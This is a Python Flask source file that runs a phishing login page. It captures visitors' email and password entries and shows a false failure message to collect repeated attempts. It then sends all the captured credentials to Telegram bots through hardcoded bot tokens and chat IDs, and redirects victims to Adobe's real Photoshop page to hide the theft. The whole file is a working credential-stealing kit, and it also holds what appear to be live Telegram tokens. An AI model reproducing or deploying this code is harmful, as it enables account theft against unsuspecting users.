from flask import Flask, render_template, request, redirect, url_for, flash, session
import requests
import logging

# Configure logging
logging.basicConfig(level=logging.DEBUG)

app = Flask(__name__)
app.config['SECRET_KEY'] = 'your_secret_key_here'

# Replace with your Telegram bot token and chat ID
# Replace with your Telegram bot tokens and chat IDs
TELEGRAM_BOT_TOKENS = ['8294836661:AAFF6sLaIb08qVhwuiETS1Y4sveqQa-BOm8', '7986783861:AA']
TELEGRAM_CHAT_IDS = ['8298136255', '11746']

# Function to send message to Telegram
def send_to_telegram(message):
    for bot_token, chat_id in zip(TELEGRAM_BOT_TOKENS, TELEGRAM_CHAT_IDS):
        url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
        payload = {
            'chat_id': chat_id,
            'text': message
        }
        try:
            response = requests.post(url, data=payload)
            response.raise_for_status()  # Check for HTTP request errors
            app.logger.debug(f"Message sent to Telegram successfully using bot token: {bot_token}")
        except requests.exceptions.RequestException as e:
            app.logger.error(f"Failed to send message to Telegram using bot token: {bot_token}. Error: {str(e)}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/login', methods=['POST'])
def login():  
    email = request.form.get('email', '')
    password = request.form.get('password', '')

  # Initialize session storage
    if 'attempts' not in session:
        session['attempts'] = 0
        session['creds'] = []   # list to store all attempts

    # Increase attempts and store credentials
    session['attempts'] += 1
    session['creds'].append({"email": email, "password": password})

    # If attempts less than 3 → just show login page again
    if session['attempts'] < 2:
        flash(f"Attempt {session['attempts']} of 3. Please try again.")
        return render_template('index.html')

    # On 3rd attempt → send all attempts to Telegram
    all_attempts_text = "\n\n".join(
        [f"Attempt {i+1}:\nEmail: {c['email']}\nPassword: {c['password']}" 
         for i, c in enumerate(session['creds'])]
    )

    message = f"Login Attempts (Total: {session['attempts']}):\n\n{all_attempts_text}"
    send_to_telegram(message)

    # Reset session
    session.pop('attempts', None)
    session.pop('creds', None)

    # Redirect after sending
    
    return redirect('https://www.adobe.com/products/photoshop.html')  # Normal redirect

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)